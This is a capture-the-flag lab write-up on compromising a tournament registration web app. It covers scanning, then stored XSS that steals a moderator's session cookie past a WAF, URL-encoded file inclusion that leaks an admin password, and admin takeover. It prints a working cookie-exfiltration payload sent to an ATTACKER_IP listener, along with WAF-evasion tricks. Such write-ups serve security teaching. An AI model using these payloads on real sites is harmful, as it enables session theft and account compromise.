1. Initial Reconnaissance

I started by performing a full TCP scan against the target to identify all exposed services.
 nmap -sC -sV -p- 10.112.168.105

The scan revealed two open ports:
 22/tcp  open  ssh
 80/tcp  open  http

Port 22 was running OpenSSH, while port 80 was hosting an Apache web server on Ubuntu.
The HTTP service also revealed a PHPSESSID cookie without the HttpOnly flag, which was an interesting detail to keep in mind during the web application assessment.

I then opened the web application in a browser.
The page appeared to be a simple tournament registration application called Padelify.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

2. Directory Enumeration

My next step was to enumerate the web server for hidden files and directories.

I used Dirsearch for this:
 dirsearch -u http://10.112.168.105

Among the discovered paths, two directories immediately caught my attention:
 /logs
 /config

The /config directory contained an app.conf file, although directly accessing it was blocked by the WAF.
The /logs directory was more accessible and contained an error.log file.

After reviewing the log, I noticed evidence of a previous XSS attempt. This was an important clue because it suggested that the application could potentially be vulnerable to cross-site scripting despite the presence of the WAF.
The registration page also mentioned that registrations required moderator approval.

That made the moderator an interesting target: if an XSS payload could execute in the moderator's browser, it might be possible to obtain the moderator's session.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

3. Identifying the XSS

To verify whether injected HTML could make an outbound request, I started a simple HTTP server on my attacker machine:
 python3 -m http.server 5000

I then submitted the following payload through the registration functionality:
<img src='http://ATTACKER_IP:5000'>

The purpose of this payload was simply to determine whether the HTML would be rendered by the moderator's browser.
When the request appeared on my HTTP server, it confirmed that the injected HTML was being processed successfully.
At this point, I knew that XSS was possible and that the main challenge was finding a payload that could get past the WAF.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

4. Bypassing the XSS Filters

I tested several variations of XSS payloads and identified a number of filtering rules.

The WAF was blocking:
 <script> tags
 The literal word cookie
 <img> tags combined with onload or onerror
 Several HTML entity encoded variations

Since the obvious payloads were being detected, I changed the approach instead of repeatedly modifying the same syntax.
An <iframe> with an onload event provided another way to execute JavaScript:
 <iframe onload="new Image().src='http://ATTACKER_IP:1234?x='+document['coo'+'kie']">

The important part of the payload is:
 document['coo'+'kie']

Rather than writing document.cookie directly, the string is constructed dynamically by JavaScript.
The browser interprets it as:
 document.cookie

while the original request does not contain the literal cookie token in the same form that the WAF was looking for.
When the moderator viewed the malicious registration, the JavaScript executed and sent the session information to my listener.

I successfully received the moderator's session cookie.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

5. Accessing the Moderator Dashboard

With the captured session value, I opened the browser's developer tools and went to the browser storage section.
I replaced my existing session cookie with the moderator's cookie.
After refreshing the application, the server recognized the session as belonging to the moderator.
I was redirected to the dashboard, where the first flag was displayed.
This confirmed that the XSS vulnerability could be used for privilege escalation by taking over the moderator's session.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

6. Finding a Path to Administrator Access

After obtaining moderator access, I continued exploring the available functionality.
The dashboard contained a Live link in the navigation bar.
Following it led to a page containing a GET parameter similar to:
 ?page=match.php

The presence of a parameter controlling which page was loaded immediately made me consider whether the application was performing server-side file retrieval.
I first tested a common local file path:
 /etc/passwd

However, the WAF detected and blocked the request.
I then remembered the app.conf file discovered earlier under:
 /config/app.conf


Directly supplying this path through the page parameter was also blocked.
This suggested that the application might allow the file to be retrieved, but the WAF was identifying recognizable strings in the request.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

7. URL-Encoding WAF Bypass

Instead of sending the path in its normal representation, I encoded it using URL encoding.
The original path was:
 /config/app.conf

I converted the path into its URL-encoded form using Burp Suite and sent the modified request.
The WAF did not recognize the encoded representation as the same malicious path, while the application subsequently decoded it and processed the requested resource.
The response contained the contents of app.conf.

One particularly interesting entry was:
 admin_info = "bL}8,S9W1o44"

This value looked like an administrator credential.

 ---------------            ---------------            ---------------            ---------------            ---------------            ---------------                                                                   

8. Administrator Compromise

I returned to the application's login page and tested the discovered value against the admin account.
The credentials were accepted successfully.
I was now authenticated as the administrator and had full administrative access to the application.

The final flag was displayed after gaining administrator access.
